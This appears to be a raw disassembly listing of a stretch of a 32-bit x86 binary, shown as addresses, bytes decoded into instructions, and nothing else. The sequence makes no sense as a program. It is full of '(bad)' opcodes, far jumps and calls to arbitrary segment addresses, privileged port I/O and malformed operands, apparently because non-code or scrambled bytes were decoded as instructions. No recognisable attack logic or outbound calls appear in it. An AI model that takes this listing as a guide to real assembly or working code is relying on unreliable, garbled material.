  4094a0:	stos   DWORD PTR es:[edi],eax
  4094a1:	sbb    al,0xc3
  4094a3:	xchg   esi,eax
  4094a4:	pop    edx
  4094a5:	fcomp  st(2)
  4094a7:	mov    cl,0xa7
  4094a9:	xor    eax,0x73506299
  4094ae:	les    edi,FWORD PTR ds:0x12f1a379
  4094b4:	retf   
  4094b5:	or     ebp,ecx
  4094b7:	(bad)  
  4094b8:	push   esp
  4094b9:	(bad)  
  4094bb:	cmc    
  4094bc:	fld    TBYTE PTR [ecx-0x66]
  4094bf:	pop    esi
  4094c0:	icebp  
  4094c1:	fcomip st,st(5)
  4094c3:	and    eax,0xa741990a
  4094c8:	dec    eax
  4094c9:	cmp    eax,edx
  4094cb:	xchg   esi,eax
  4094cc:	ins    BYTE PTR es:[edi],dx
  4094cd:	shl    DWORD PTR ss:[ecx-0x75a2654e],1
  4094d4:	leave  
  4094d5:	xor    BYTE PTR [ebx+0x6d],bh
  4094d8:	and    DWORD PTR [eax],ecx
  4094da:	popf   
  4094db:	sub    DWORD PTR [eax],0x19
  4094de:	or     eax,0x6a43a66
  4094e3:	ss mov al,0x33
  4094e6:	ins    BYTE PTR es:[edi],dx
  4094e7:	inc    DWORD PTR [eax+0x7c]
  4094ea:	xor    bh,ah
  4094ec:	or     al,0x73
  4094ee:	fwait
  4094ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094f0:	pop    esp
  4094f1:	outs   dx,BYTE PTR ds:[esi]
  4094f2:	out    0xc3,al
  4094f4:	jae    0x40955e
  4094f6:	loopne 0x409508
  4094f8:	push   esp
  4094f9:	popa   
  4094fa:	jmp    0xd93c:0xa836b217
  409501:	pop    esi
  409502:	mov    ?,WORD PTR [ebx+0x2b]
  409505:	or     ebp,ecx
  409507:	or     ebx,0xa9cf0455
  40950d:	fadd   DWORD PTR [edx+eiz*8-0x52252625]
  409514:	dec    esi
  409515:	pushf  
  409516:	jnp    0x4094cd
  409518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409519:	or     esp,DWORD PTR [edx]
  40951b:	ficom  DWORD PTR [esi+eiz*4+0xaaa026c]
  409522:	cmp    dl,BYTE PTR [esi]
  409524:	push   eax
  409525:	mov    ds,WORD PTR [edx+0x2b89723e]
  40952b:	push   ds
  40952c:	or     esp,edi
  40952e:	mov    ds:0x1ea47a7,eax
  409533:	cdq    
  409534:	add    ah,dl
  409536:	stc    
  409537:	ss out dx,al
  409539:	bound  ebp,QWORD PTR [ebp-0x341e9859]
  40953f:	es clc 
  409541:	in     eax,0x6f
  409543:	dec    ebx
  409544:	inc    eax
  409545:	or     ebx,DWORD PTR [ecx-0x2107f55f]
  40954b:	test   BYTE PTR [ebx+0xe729a46],dh
  409551:	mov    dh,0x1d
  409553:	pop    ebx
  409554:	push   ebp
  409555:	push   esi
  409556:	jp     0x409513
  409558:	ret    
  409559:	in     eax,0xe6
  40955b:	out    0xb4,eax
  40955d:	jb     0x409571
  40955f:	cmp    al,0xf9
  409561:	or     al,0x9a
  409563:	push   ecx
  409564:	xlat   BYTE PTR ds:[ebx]
  409565:	and    BYTE PTR [ecx-0x40],bh
  409568:	pop    edx
  409569:	mov    bh,0xa0
  40956b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40956c:	je     0x40956a
  40956e:	in     eax,dx
  40956f:	mov    ebp,0x8bdd5b3a
  409574:	scas   eax,DWORD PTR es:[edi]
  409575:	fimul  WORD PTR [ebx+0x17b572cb]
  40957b:	mov    DWORD PTR [ecx+0x1f],esp
  40957e:	jbe    0x409526
  409580:	div    BYTE PTR [ebp+ecx*2+0x20]
  409584:	fs ins BYTE PTR es:[edi],dx
  409586:	je     0x409607
  409588:	cli    
  409589:	sbb    bl,BYTE PTR [edx+0x6305d45c]
  40958f:	movups xmm6,XMMWORD PTR [ecx]
  409592:	mov    dh,0x41
  409594:	cmc    
  409595:	or     ebp,DWORD PTR [ecx]
  409597:	test   DWORD PTR [edx-0x72],ebx
  40959a:	out    0x83,eax
  40959c:	inc    ebp
  40959d:	(bad)
  4095a0:	xchg   esp,eax
  4095a1:	call   0xcded:0x26b271de
  4095a8:	mov    cl,0xae
  4095aa:	pop    ebp
  4095ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ac:	(bad)  
  4095ad:	pop    ebx
  4095ae:	int3   
  4095af:	jno    0x409600
  4095b1:	outs   dx,BYTE PTR ds:[esi]
  4095b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b3:	ja     0x4095d2
  4095b5:	mov    ecx,DWORD PTR [edx]
  4095b7:	test   eax,0xa865d602
  4095bc:	xchg   ebx,eax
  4095bd:	or     edi,ebp
  4095bf:	dec    ebp
  4095c0:	push   ecx
  4095c1:	sbb    eax,esi
  4095c3:	xchg   edi,eax
  4095c4:	call   0x73c33045
  4095c9:	lods   al,BYTE PTR ds:[esi]
  4095ca:	sbb    BYTE PTR [ecx],dh
  4095cc:	mov    eax,ds:0x6a767a6
  4095d1:	inc    ebp
  4095d2:	jmp    0x8d28c2b8
  4095d7:	js     0x409567
  4095d9:	pop    eax
  4095da:	and    esp,DWORD PTR [edi]
  4095dc:	or     eax,0x83a1b274
  4095e1:	sbb    BYTE PTR [ecx+0x56bc6ff6],bh
  4095e7:	push   0x36
  4095e9:	or     eax,DWORD PTR [edx-0x7061b1a9]
  4095ef:	dec    edi
  4095f0:	adc    esi,DWORD PTR [ebp+0x5eb247ed]
  4095f6:	in     al,0x33
  4095f8:	jne    0x40963c
  4095fa:	mov    WORD PTR [ebx],cs
  4095fc:	add    DWORD PTR [ebx],ecx
  4095fe:	mov    bh,0xf8
  409600:	aad    0xd6
  409602:	adc    DWORD PTR [eax],edx
  409604:	dec    DWORD PTR [eax-0x66]
  409607:	into   
  409608:	cmp    eax,ecx
  40960a:	dec    eax
  40960b:	arpl   WORD PTR [ecx+0x45],bp
  40960e:	retf   
  40960f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409610:	dec    eax
  409611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409612:	and    BYTE PTR [ebx],0x1
  409615:	adc    eax,0x20b2f1b9
  40961a:	rep stos BYTE PTR es:[edi],al
  40961c:	jle    0x40962e
  40961e:	rcr    ch,1
  409620:	jb     0x409695
  409622:	dec    eax
  409623:	sar    DWORD PTR ds:0xefb4190b,1
  409629:	mov    eax,ds:0xf92a01a5
  40962e:	call   0xc68a:0x64582671
  409635:	add    al,0x7e
  409637:	test   eax,0x82e53661
  40963c:	push   edx
  40963d:	mov    edi,0x567d4dbb
  409642:	call   0xa5b7:0x9bfd2b52
  409649:	mov    ds:0x8682a6e0,eax
  40964e:	cli    
  40964f:	nop
  409650:	push   0x55d75511
  409655:	dec    edi
  409656:	fwait
  409657:	dec    eax
  409658:	stos   BYTE PTR es:[edi],al
  409659:	xchg   ecx,eax
  40965a:	pop    esi
  40965b:	stos   BYTE PTR es:[edi],al
  40965c:	stos   DWORD PTR es:[edi],eax
  40965d:	sahf   
  40965e:	cli    
  40965f:	das    
  409660:	mov    al,ds:0xcaa7927d
  409665:	retf   
  409666:	and    BYTE PTR ds:0x3c6d2046,ch
  40966c:	lods   eax,DWORD PTR ds:[esi]
  40966d:	test   BYTE PTR [ebx],ch
  40966f:	jbe    0x409623
  409671:	test   al,0x0
  409673:	mov    al,0xf0
  409675:	je     0x4096c8
  409677:	dec    ecx
  409678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409679:	or     eax,DWORD PTR [ebx]
  40967b:	bound  esi,QWORD PTR [ebx-0x253b2e47]
  409681:	int3   
  409682:	call   0x8a3a:0xa9459ffc
  409689:	pop    edi
  40968a:	mov    dh,0xb4
  40968c:	dec    eax
  40968d:	ret    
  40968e:	xchg   esi,eax
  40968f:	sbb    eax,0x87d065bd
  409694:	xchg   ebp,eax
  409695:	mov    ecx,0xbded3e0
  40969a:	int3   
  40969b:	and    al,0x5a
  40969d:	dec    ebp
  40969e:	fs pushf 
  4096a0:	sbb    ah,BYTE PTR [eax-0x66]
  4096a3:	mov    dl,0xac
  4096a5:	pop    edx
  4096a6:	xchg   edi,eax
  4096a7:	inc    ebx
  4096a8:	call   0x6fe82905
  4096ad:	inc    edx
  4096ae:	xchg   esi,eax
  4096af:	fwait
  4096b0:	lds    ebp,FWORD PTR [ebp+0x13b2e826]
  4096b6:	div    DWORD PTR [eax]
  4096b8:	xchg   ebp,eax
  4096b9:	(bad)  
  4096bb:	mov    DWORD PTR [eax+0x5],ebp
  4096be:	shl    DWORD PTR [ecx-0x5872d246],1
  4096c4:	inc    edi
  4096c5:	scas   eax,DWORD PTR es:[edi]
  4096c6:	imul   ecx,DWORD PTR [edi+eax*2-0x2ef378e5],0x50b3daf5
  4096d1:	mov    DWORD PTR [edx],ecx
  4096d3:	lahf   
  4096d4:	sbb    BYTE PTR [ebx],cl
  4096d6:	int3   
  4096d7:	jmp    0x40974a
  4096d9:	add    DWORD PTR [ebx-0x6e625736],0x17
  4096e0:	xor    cl,ah
  4096e2:	and    DWORD PTR [edi+0xa010cab],0x7e200b3b
  4096ec:	out    dx,eax
  4096ed:	mov    al,0xd1
  4096ef:	push   es
  4096f0:	mov    bl,0xfe
  4096f2:	call   0x96a5:0x3e51fe74
  4096f9:	jnp    0x409698
  4096fb:	sahf   
  4096fc:	add    edx,DWORD PTR [ebp-0x464d78d9]
  409702:	in     eax,dx
  409703:	ins    DWORD PTR es:[edi],dx
  409704:	mov    al,ds:0xb18aa1a4
  409709:	cmp    ebx,DWORD PTR [ebx+edx*8-0x2b]
  40970d:	int3   
  40970e:	mov    esp,DWORD PTR [edi-0x4f1e40be]
  409714:	sbb    BYTE PTR [esi+0x46],ch
  409717:	adc    DWORD PTR [edx+0x3489794b],esi
  40971d:	cmp    eax,0xb54d178
  409722:	pop    edi
  409723:	shl    ebx,0x5b
  409726:	inc    ecx
  409727:	push   ebx
  409728:	jb     0x4096bf
  40972a:	xchg   DWORD PTR [esp+ebp*2],eax
  40972d:	dec    eax
  40972e:	sbb    dl,BYTE PTR [ecx]
  409730:	dec    esi
  409731:	mov    ecx,0x78a5c3bc
  409736:	cmp    bh,0xb8
  409739:	in     al,0x86
  40973b:	rcr    BYTE PTR [esi-0x74],1
  40973e:	cmp    bl,BYTE PTR [ecx]
  409740:	repz imul esi,DWORD PTR [ebx],0xffffffd2
  409744:	(bad)  
  409745:	out    0x9a,al
  409747:	mov    ds:0x5f807362,al
  40974c:	adc    DWORD PTR [edi+esi*8],esp
  40974f:	cdq    
  409750:	ret    0x1ab8
  409753:	mov    eax,0x64cd1d56
  409758:	mov    ebx,0x63369a77
  40975d:	inc    edi
  40975e:	in     al,0xb0
  409760:	xchg   edx,eax
  409761:	imul   ecx,DWORD PTR [bx+si-0x36ef],0x56a07ce6
  40976a:	xchg   ebp,eax
  40976b:	lea    ebp,[esi+0x3b7ea24b]
  409771:	push   edx
  409772:	out    0xa7,eax
  409774:	dec    esp
  409775:	jmp    0xc655:0x589a9567
  40977c:	mov    dl,0x94
  40977e:	rcl    BYTE PTR [edi-0x7290f0fd],1
  409784:	mov    ecx,DWORD PTR [ebx]
  409786:	xor    DWORD PTR [eax],ebp
  409788:	mov    ch,0xed
  40978b:	or     BYTE PTR [edx],dh
  40978d:	jmp    FWORD PTR [edi]
  40978f:	jg     0x40971d
  409791:	or     al,0x60
  409793:	push   ebp
  409794:	push   esi
  409795:	and    eax,0x5abed4b7
  40979a:	jp     0x409759
  40979c:	mov    ?,WORD PTR [ecx]
  40979e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40979f:	mov    dl,0x9
  4097a1:	mov    bl,0x50
  4097a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a4:	outs   dx,DWORD PTR ds:[esi]
  4097a5:	xchg   edi,eax
  4097a6:	jmp    0xb91427a
  4097ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ac:	or     al,0x36
  4097ae:	dec    ebp
  4097af:	(bad)  
  4097b0:	xchg   ebp,eax
  4097b1:	push   cs
  4097b2:	ret    
  4097b3:	and    eax,0x338ef9b2
  4097b8:	jns    0x4097ef
  4097ba:	cdq    
  4097bb:	cmp    al,0xe9
  4097bd:	sbb    al,0x50
  4097bf:	loop   0x409826
  4097c1:	or     ebx,DWORD PTR [ebp+esi*8-0xc725e3e]
  4097c8:	mov    cl,0x6e
  4097ca:	fldenv [ebx]
  4097cc:	leave  
  4097cd:	pop    ss
  4097ce:	inc    ebp
  4097cf:	inc    edi
  4097d0:	mov    ch,0x5e
  4097d2:	or     al,0xa7
  4097d4:	jae    0x40982a
  4097d6:	sbb    eax,0x89731957
  4097db:	lods   eax,DWORD PTR ds:[esi]
  4097dc:	mov    dl,0xe2
  4097de:	xchg   esp,eax
  4097df:	aas    
  4097e0:	adc    edi,DWORD PTR [edi+0xb1eb295]
  4097e6:	and    eax,0xc2322295
  4097eb:	das    
  4097ec:	xchg   edi,eax
  4097ed:	adc    bl,BYTE PTR [edx-0x3e909bf9]
  4097f3:	pop    ecx
  4097f4:	scas   eax,DWORD PTR es:[edi]
  4097f5:	mov    ch,0x10
  4097f7:	inc    edi
  4097f8:	xor    BYTE PTR [ebx],cl
  4097fa:	mov    bh,0x6d
  4097fc:	jle    0x4097e6
  4097fe:	and    al,BYTE PTR [ebx+0x4a9ab7ec]
  409804:	inc    edx
  409805:	xor    eax,DWORD PTR [esi]
  409807:	cli    
  409808:	or     BYTE PTR [eax+eax*2],0xa0
  40980c:	mov    bh,0x26
  40980e:	inc    esi
  40980f:	push   ds
  409810:	std    
  409811:	dec    ebx
  409812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409813:	push   ebx
  409814:	cmp    DWORD PTR [ebx-0x66],0xfebe2964
  40981b:	mov    ebp,0xa7513462
  409820:	popa   
  409821:	cmp    esi,esp
  409823:	popa   
  409824:	fiadd  WORD PTR [edx]
  409826:	shl    edx,1
  409828:	scas   al,BYTE PTR es:[edi]
  409829:	mov    ah,0x84
  40982b:	shl    DWORD PTR [edx+0x25fba7ee],0xfc
  409832:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409834:	jecxz  0x409877
  409836:	sbb    al,0xa8
  409838:	jmp    0xb568:0xbde3dce5
  40983f:	test   eax,0x3b1b3508
  409844:	imul   esi,DWORD PTR [esi-0x1],0x136c565c
  40984b:	pop    edi
  40984c:	sbb    eax,0xdf7ac20b
  409851:	fnstcw WORD PTR [ebx-0x659634e8]
  409857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409858:	int3   
  409859:	into   
  40985a:	pop    esi
  40985b:	outs   dx,BYTE PTR ds:[esi]
  40985c:	scas   al,BYTE PTR es:[edi]
  40985d:	mov    dh,0x4f
  40985f:	mov    edx,0x2730fe11
  409864:	aas    
  409865:	jmp    0x34a89f05
  40986a:	xchg   esp,eax
  40986b:	sar    DWORD PTR [esi+ecx*4+0x75],1
  40986f:	xchg   DWORD PTR [esi+0x54],ebp
  409872:	inc    ebp
  409873:	pop    edx
  409874:	cdq    
  409875:	adc    al,0x3e
  409877:	xchg   DWORD PTR [edx+0xb],ebp
  40987a:	das    
  40987b:	cmp    eax,0x26279fef
  409880:	mov    dl,0xc8
  409882:	sbb    DWORD PTR [ebx+0x70],esp
  409885:	jbe    0x4098de
  409887:	xchg   edi,eax
  409888:	imul   ecx,DWORD PTR [ebx],0xffffff90
  40988b:	add    edx,DWORD PTR [ebx-0x68]
  40988e:	dec    esi
  40988f:	inc    eax
  409890:	inc    ecx
  409891:	xor    BYTE PTR [ebp-0x1a4fff52],al
  409897:	daa    
  409898:	jno    0x40988d
  40989a:	push   ss
  40989b:	or     al,0xbe
  40989d:	out    0x8a,al
  40989f:	mov    al,ds:0x69b54b14
  4098a4:	push   ebp
  4098a5:	jmp    0x40989b
  4098a7:	jle    0x409835
  4098a9:	sbb    BYTE PTR [edx-0x25],bh
  4098ac:	mov    dl,0x9f
  4098ae:	rol    BYTE PTR [esi+0x7cd81f9],cl
  4098b4:	lock pop ss
  4098b6:	leave  
  4098b7:	xchg   esi,eax
  4098b8:	ret    0x69c
  4098bb:	mov    al,ds:0x7af7444
  4098c0:	jmp    0x2dd53d53
  4098c5:	retf   
  4098c6:	sub    bh,BYTE PTR ds:0x29930b7b
  4098cc:	rcl    BYTE PTR [ecx+ecx*4-0x73],0xbf
  4098d1:	lea    ebx,[edx-0x12f1ae50]
  4098d7:	(bad)  
  4098d8:	(bad)  
  4098d9:	out    dx,eax
  4098da:	mov    eax,ds:0xac675aa7
  4098df:	(bad)  
  4098e0:	fidiv  DWORD PTR [ebx-0x6]
  4098e3:	div    BYTE PTR [edx-0x1941ccb0]
  4098e9:	sub    DWORD PTR [ebx+0x21],esi
  4098ec:	xlat   BYTE PTR ds:[ebx]
  4098ed:	je     0x409942
  4098ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f0:	add    ecx,ebp
  4098f2:	jge    0x40991a
  4098f4:	ss or  al,0xa6
  4098f7:	sbb    esi,DWORD PTR [edx-0x555b5a36]
  4098fd:	mov    eax,ds:0x850e741
  409902:	pop    ss
  409903:	add    eax,0x88d7c692
  409908:	add    dh,BYTE PTR [eax+0x76b2b69b]
  40990e:	add    BYTE PTR [edi],dl
  409910:	mov    edi,0x57199b0
  409916:	lods   al,BYTE PTR ds:[esi]
  409917:	(bad)
  40991a:	jge    0x409929
  40991c:	jge    0x4098e9
  40991e:	inc    esp
  40991f:	xlat   BYTE PTR ds:[ebx]
  409920:	(bad)  
  409921:	sbb    DWORD PTR [edx+0x36200e0],ebx
  409927:	cmp    eax,0xa7f78141
  40992c:	fst    QWORD PTR [edi+ecx*1]
  40992f:	sub    DWORD PTR [ebx],ebx
  409931:	and    DWORD PTR [esi-0x5dd64d28],esp
  409937:	add    ebp,DWORD PTR [edx]
  409939:	and    al,0x90
  40993b:	sar    BYTE PTR [esi+0x345ddc0b],cl
  409941:	cmp    al,0x48
  409943:	or     DWORD PTR [edx],esi
  409945:	in     eax,dx
  409946:	call   0xa347:0x87132e60
  40994d:	std    
  40994e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409950:	pop    esp
  409951:	leave  
  409952:	cmp    DWORD PTR [edx],0x39
  409955:	xor    eax,0xd4af26b8
  40995a:	inc    edx
  40995b:	mov    al,0xb2
  40995d:	mov    DWORD PTR [ebx+ebx*2-0x5fcc825e],esi
  409964:	lahf   
  409965:	jnp    0x4098e9
  409967:	lahf   
  409968:	retf   0x1404
  40996b:	or     dl,BYTE PTR [edx+0x2b]
  40996e:	daa    
  40996f:	fld    TBYTE PTR [edx]
  409971:	adc    bl,BYTE PTR [edx-0x52989c47]
  409977:	dec    esi
  409978:	outs   dx,BYTE PTR ds:[esi]
  409979:	and    bl,BYTE PTR [ebx-0x77c1da60]
  40997f:	sub    al,dl
  409981:	jnp    0x409973
  409983:	xchg   ecx,eax
  409984:	mov    eax,0x668b9b50
  409989:	or     ecx,edi
  40998b:	push   eax
  40998c:	test   eax,0x70674416
  409991:	xor    cl,dh
  409993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409994:	je     0x409935
  409996:	sbb    cl,cl
  409998:	mov    es,WORD PTR [eax]
  40999a:	jecxz  0x4099d7
  40999c:	mov    dl,0x5a
  40999e:	mov    ch,0x18
  4099a0:	in     al,dx
  4099a1:	fstp   DWORD PTR [ebx]
  4099a3:	adc    ebp,DWORD PTR [edi+0x8f0eb0b]
  4099a9:	repz or BYTE PTR [eax+esi*2-0x6c],0x9a
  4099af:	into   
  4099b0:	sti    
  4099b1:	lock and al,0xa9
  4099b4:	mov    eax,ds:0xdda47525
  4099b9:	mov    edi,0x9632759f
  4099be:	call   0x52d9:0x31fd3ccd
  4099c5:	sbb    DWORD PTR [ecx],edx
  4099c7:	mov    al,ds:0xb9948418
  4099cc:	or     ecx,DWORD PTR [ebx+0x76c73b9]
  4099d2:	call   0x82aa:0xa0c78a5f
  4099d9:	ret    
  4099da:	outs   dx,BYTE PTR ds:[esi]
  4099db:	cdq    
  4099dc:	or     al,0x5b
  4099de:	mov    al,ds:0x982932fd
  4099e3:	inc    eax
  4099e4:	sahf   
  4099e5:	add    BYTE PTR [ebx-0x6c],bl
  4099e8:	mov    dl,0x68
  4099ea:	xlat   BYTE PTR ds:[ebx]
  4099eb:	jle    0x4099ce
  4099ed:	cdq    
  4099ee:	inc    esi
  4099ef:	inc    esp
  4099f0:	lock mov bl,0xdc
  4099f3:	test   eax,0xf851c594
  4099f8:	rol    BYTE PTR [eax-0x39],cl
  4099fb:	gs dec edx
  4099fd:	ds call 0x5240:0x8e225f1e
  409a05:	bound  esp,QWORD PTR [ebp-0x57]
  409a08:	xor    eax,0x927b6aa3
  409a0d:	xor    eax,0x3b15ae6c
  409a12:	out    dx,al
  409a13:	lahf   
  409a14:	lods   eax,DWORD PTR ds:[esi]
  409a15:	imul   DWORD PTR [ecx+0x55]
  409a18:	mov    dl,0xbe
  409a1a:	mov    DWORD PTR [ebx],eax
  409a1c:	cmp    al,0x58
  409a1e:	jae    0x409a0f
  409a20:	imul   edi,DWORD PTR [esi-0x65204d66],0x404e13b4
  409a2a:	xchg   ecx,eax
  409a2b:	cmp    edx,esp
  409a2d:	test   al,0xe2
  409a2f:	jo     0x4099e3
  409a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a32:	inc    esp
  409a33:	dec    ecx
  409a34:	cmp    al,0x3
  409a36:	push   0x59
  409a38:	retf   0x9aee
  409a3b:	out    0x7c,al
  409a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a3e:	sub    DWORD PTR [edi-0x40],edx
  409a41:	rol    eax,cl
  409a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a44:	in     al,0x9b
  409a46:	or     eax,0x88a5cd7
  409a4b:	test   al,0xc2
  409a4d:	stc    
  409a4e:	mov    WORD PTR [esi-0x5f9ee294],gs
  409a54:	pushf  
  409a55:	jmp    0x2d90:0xc434a77e
  409a5c:	mov    esp,0x369ebf1b
  409a61:	stos   DWORD PTR es:[edi],eax
  409a62:	not    BYTE PTR [edi]
  409a64:	loop   0x409a24
  409a66:	xchg   edx,eax
  409a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a68:	repnz out dx,al
  409a6a:	popa   
  409a6b:	inc    ebp
  409a6c:	push   ebx
  409a6d:	xor    DWORD PTR [edx],eax
  409a6f:	jbe    0x409a39
  409a71:	dec    ebp
  409a72:	call   0x114b:0x523e8b55
  409a79:	ffree  st(2)
  409a7b:	pop    ebx
  409a7c:	stos   BYTE PTR es:[edi],al
  409a7d:	or     esp,DWORD PTR [ebp+0x285f80c1]
  409a83:	inc    edi
  409a84:	test   cl,cl
  409a86:	call   0x46fc:0xe92e5566
  409a8d:	push   cs
  409a8e:	inc    ecx
  409a8f:	push   ebx
  409a90:	dec    esp
  409a91:	or     esi,DWORD PTR [eax]
  409a93:	inc    esi
  409a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a95:	ret    0x5b61
  409a98:	lock fdiv DWORD PTR [edi-0x17226620]
  409a9f:	mov    al,ds:0xa7d43aa9
  409aa4:	data16 jnp 0x409ab3
  409aa7:	pop    esp
  409aa8:	jae    0x409a8f
  409aaa:	adc    BYTE PTR [eax],bl
  409aac:	not    DWORD PTR [ebp-0x76bd8495]
  409ab2:	mov    edx,0x1e1f87a7
  409ab7:	ins    DWORD PTR es:[edi],dx
  409ab8:	int    0x5c
  409aba:	leave  
  409abb:	imul   edi,DWORD PTR [edi]
  409abe:	inc    esp
  409ac0:	repnz fstp TBYTE PTR [edi]
  409ac3:	xchg   ebp,eax
  409ac4:	pop    es
  409ac5:	(bad)  
  409ac6:	repz mov ds:0x17384f31,al
  409acc:	adc    ecx,DWORD PTR [ecx+ebp*1]
  409acf:	outs   dx,BYTE PTR ds:[esi]
  409ad0:	das    
  409ad1:	jnp    0x409a7d
  409ad3:	je     0x409aef
  409ad5:	mov    bh,0x9b
  409ad7:	pop    ebp
  409ad8:	xchg   ebp,eax
  409ad9:	rol    DWORD PTR [eax],1
  409adb:	adc    eax,0xceba343f
  409ae0:	xchg   ebx,eax
  409ae1:	add    al,0x8
  409ae3:	cmp    BYTE PTR [ebx+0x472825f5],bh
  409ae9:	cld    
  409aea:	cmp    cl,BYTE PTR [esi]
  409aec:	ja     0x409b3c
  409aee:	je     0x409af1
  409af0:	mov    cl,0x58
  409af2:	rcr    BYTE PTR [ebp+0x672ad8d1],cl
  409af8:	sbb    BYTE PTR [ebx+0x2d],0xa7
  409afc:	sbb    eax,0x5378ae08
  409b01:	das    
  409b02:	push   cs
  409b03:	jmp    0x409ab7
  409b05:	mov    ds:0x3cf13de5,eax
  409b0a:	fistp  QWORD PTR [eax+0x17d30c41]
  409b10:	mov    ah,ah
  409b12:	div    DWORD PTR [edi]
  409b14:	fsubrp st(0),st
  409b16:	int3   
  409b17:	jecxz  0x409acb
  409b19:	ret    0xb680
  409b1c:	loopne 0x409ab8
  409b1e:	adc    DWORD PTR [ecx],esi
  409b20:	cs add eax,0x545b7c15
  409b26:	jp     0x409b08
  409b28:	sub    eax,0xae765946
  409b2d:	push   ss
  409b2e:	inc    eax
  409b2f:	(bad)  
  409b31:	cwde   
  409b32:	add    eax,DWORD PTR [edi-0x5f528272]
  409b38:	push   ecx
  409b39:	mov    eax,0x6a071eb4
  409b3e:	xlat   BYTE PTR ds:[ebx]
  409b3f:	outs   dx,BYTE PTR ds:[esi]
  409b40:	aam    0x7b
  409b42:	std    
  409b43:	add    cl,dh
  409b45:	xchg   edx,eax
  409b46:	call   0xfaa:0x1def1259
  409b4d:	loop   0x409b86
  409b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b50:	cmp    bl,ah
  409b52:	clc    
  409b53:	pop    eax
  409b54:	(bad)  
  409b55:	test   al,0x2d
  409b57:	sbb    esi,DWORD PTR [edx-0x36fab4c0]
  409b5d:	ins    DWORD PTR es:[edi],dx
  409b5e:	std    
  409b5f:	in     eax,0x67
  409b61:	or     ecx,DWORD PTR [edi]
  409b63:	inc    eax
  409b64:	(bad)  
  409b65:	mov    ds:0x5f51ea2b,eax
  409b6a:	call   0x2ce:0x9b53d310
  409b71:	xchg   ecx,eax
  409b72:	cmp    ebp,DWORD PTR [eax+0x1596109a]
  409b78:	xchg   edx,eax
  409b79:	ret    0x5f8b
  409b7c:	xchg   esi,eax
  409b7d:	scas   al,BYTE PTR es:[edi]
  409b7e:	call   0x55dc:0x160f9eda
  409b85:	iret   
  409b86:	in     al,dx
  409b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b88:	call   0x90b6ba52
  409b8d:	call   0xe55c:0x38b3ac63
  409b94:	xor    BYTE PTR [eax],bl
  409b96:	xchg   esp,eax
  409b97:	pop    ss
  409b98:	xchg   edx,eax
  409b99:	into   
  409b9a:	(bad)  
  409b9b:	mov    ds:0xb0696b5f,eax
  409ba0:	inc    ebp
  409ba1:	leave  
  409ba2:	ss inc eax
  409ba4:	jb     0x409b31
  409ba6:	or     eax,0x95e94448
  409bab:	push   ds
  409bac:	cdq    
  409bad:	adc    BYTE PTR [esi-0x70dccd47],ah
  409bb3:	mov    edi,DWORD PTR [edx-0x13]
  409bb6:	enter  0xc898,0x28
  409bba:	sbb    cl,BYTE PTR [edx+0x41]
  409bbd:	push   eax
  409bbe:	pushf  
  409bbf:	xchg   edx,eax
  409bc0:	in     eax,0x8
  409bc2:	call   0x1628:0x1479e43a
  409bc9:	mov    eax,0xdbb8a76d
  409bce:	mov    esp,0x85417540
  409bd3:	(bad)  [edx+0x3c6605ea]
  409bd9:	push   ebx
  409bda:	cmp    ebx,DWORD PTR [esp+0xc]
  409bde:	push   ecx
  409bdf:	scas   al,BYTE PTR es:[edi]
  409be0:	dec    edx
  409be1:	or     al,0xb2
  409be3:	addr16 rcl ebx,cl
  409be6:	xor    ah,BYTE PTR [ecx]
  409be8:	mov    dl,0x7c
  409bea:	mov    edi,0x26efb6e6
  409bef:	cmp    al,0x2e
  409bf1:	add    eax,0x4457937
  409bf6:	sbb    bl,BYTE PTR [edx]
  409bf8:	stos   DWORD PTR es:[edi],eax
  409bf9:	ins    BYTE PTR es:[edi],dx
  409bfa:	scas   al,BYTE PTR es:[edi]
  409bfb:	sbb    eax,0xdda872bb
  409c00:	retf   0x638b
  409c03:	aaa    
  409c04:	push   0xb3ae76c2
  409c09:	sbb    eax,0x67322ded
  409c0e:	stos   BYTE PTR es:[edi],al
  409c0f:	xor    ebp,esi
  409c11:	jg     0x409c1d
  409c13:	xchg   esp,eax
  409c14:	mov    cl,0x16
  409c16:	mov    ds:0xdd847e29,eax
  409c1b:	das    
  409c1c:	dec    edi
  409c1d:	adc    esi,eax
  409c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c20:	call   0x66a0:0xf33f88bd
  409c27:	xchg   esp,eax
  409c28:	xchg   esi,eax
  409c29:	loope  0x409c6b
  409c2b:	adc    edi,DWORD PTR [ebp+0x10689ef]
  409c31:	enter  0x4860,0xd2
  409c35:	add    DWORD PTR [edi+0x32f83ba7],edi
  409c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c3c:	inc    ebp
  409c3d:	pop    ecx
  409c3e:	loope  0x409cb5
  409c40:	scas   al,BYTE PTR es:[edi]
  409c41:	(bad)  
  409c42:	pop    edi
  409c43:	shl    BYTE PTR [edx-0x7faa7a2c],0x69
  409c4a:	jne    0x409bf1
